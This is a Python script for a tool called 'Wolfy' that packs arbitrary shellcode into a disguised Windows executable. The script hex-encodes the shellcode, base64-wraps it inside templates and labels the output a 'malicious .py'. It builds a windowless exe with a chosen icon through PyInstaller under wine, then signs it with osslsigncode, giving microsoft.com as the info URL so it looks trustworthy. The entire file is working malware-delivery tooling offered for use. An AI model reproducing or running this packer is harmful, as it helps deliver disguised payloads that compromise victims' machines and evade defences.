import argparse
import subprocess
import base64
import os

class Wolfy:


    parser = argparse.ArgumentParser()
    parser.add_argument('-s','--shellcode', action='store', help='.bin shellcode file', dest='shellcode', required=True)
    parser.add_argument('-i', '--icon', action='store', help='icon of exe', dest='icon', required=False)
    parser.add_argument('-n', '--name', action='store', help='.exe name', dest='exename', required=True)
    args = parser.parse_args()


    def __init__(self):

        self.shellcode_file = self.args.shellcode
        self.icon = self.args.icon
        self.exename = self.args.exename

    def banner(self):

        print("""


            _        _
          /\\     ,'/|
        _|  |\-'-'_/_/
   __--'/`           \\
       /              \\
      /        "o.  |o"|
      |              \\/
       \_          ___\\
         `--._`.   \\;//
              ;-.___,'
             /
           ,'
        _-'

        @ferreiraklet


        """)

    def crypto(self):


        exename = self.exename
        
        if self.icon != "":
            icon = self.icon
        else:
            icon = "cmd"


        print("[INFO] - Reading Shellcode")

        shellcode_payload = open(self.shellcode_file, "rb").read()
        shellcode_payload = bytes.hex(shellcode_payload)

        print("[INFO] - Replacing shellcode")
        # replacing shellcode 
        f_xpl_data = open("templates/xpl.py","r").read()
        f_xpl_data = f_xpl_data.replace("__replacepayload__", shellcode_payload)
        f_xpl_data = base64.b64encode(f_xpl_data.encode('utf-8'))
        # print(f_xpl_data.decode('utf-8'))

        print("[INFO] - Generating malicious .py")

        f_crypto_data = open("templates/crypto.py", "r").read()
        f_crypto_data = f_crypto_data.replace("__re__", f_xpl_data.decode("utf-8"))

        f_build = open(f"build/{exename}.py", "w")
        f_build.write(f_crypto_data)
        f_build.close()

        print("[] - Run the following command and type enter when done.")
        print(f'sudo wine "$(find ~/.wine/drive_c/ -type f -name pyinstaller.exe)" --onefile --noconsole --distpath {os.getcwd()}/ -i {os.getcwd()}/{icon} -n "{exename}" {os.getcwd()}/build/{exename}.py')
        input()
        subprocess.call(f'mv "{exename}.exe" "{exename}-not-signed.exe";osslsigncode sign -certs certificate/cert.pem -key certificate/cert.key -n "{exename}" -i https://microsoft.com/ -in "{exename}-not-signed.exe" -out "{exename}.exe";rm "{exename}-not-signed.exe"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"[INFO] - DONE! Your .exe is {exename}.exe")

if __name__ == '__main__':
    c = Wolfy()
    c.banner()
    c.crypto()

